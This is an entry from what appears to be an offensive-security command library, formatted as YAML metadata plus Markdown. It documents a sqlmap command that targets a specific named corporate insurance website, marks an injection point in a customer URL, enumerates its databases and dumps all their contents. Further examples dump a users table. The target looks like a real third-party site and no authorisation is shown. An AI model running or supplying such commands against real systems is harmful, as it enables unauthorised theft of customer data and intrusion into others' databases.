---
id: cmd-sqlmap-dump-001
data: >-
  sqlmap -u
  "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562*/contactPersonId/0"
  --dbs --dump
tags:
  - sqli
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.277Z'
verified: false
validated: true
submitted: true
---
# sqlmap-dump-database

## Command

```bash
sqlmap -u "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562*/contactPersonId/0" --dbs --dump
```

## Description

This command uses SQLmap to target a URL with a marked injection point (*), enumerating databases (--dbs) and dumping all contents (--dump) for exploitation of SQL injection vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL with injection point marked by * | Yes |
| `--dbs` | Enumerate available databases | No |
| `--dump` | Dump database tables and data | Yes |

## Examples

### Basic Usage

```bash
sqlmap -u "https://example.com/path/id*" --dbs
```

### Advanced Usage

```bash
sqlmap -u "https://example.com/path/id*" --dbs --dump -T users --columns --dump
```

## Expected Output

SQLmap payloads test the injection, then output: available databases, table lists, and CSV/JSON dumps of data. Errors if no injection or blocked.

## Related

- [[Related Procedure: Exploit-SQL-Injection-with-SQLmap]]
